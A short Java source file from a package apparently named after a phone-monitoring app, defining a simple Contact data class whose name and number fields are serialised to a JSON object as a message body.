package com.droidwatcher.lib;

import org.json.JSONException;
import org.json.JSONObject;


public class Contact implements IMessageBody {
	public String number;
	public String name;
	
	public Contact(String number, String name){
		this.number = number;
		this.name = name;
	}

	public JSONObject getJSONObject() {
		JSONObject obj = new JSONObject();
		try {
			obj.put("number", number);
			obj.put("name", name);
		} catch (JSONException e) {
			e.printStackTrace();
		}
		return obj;
	}
}
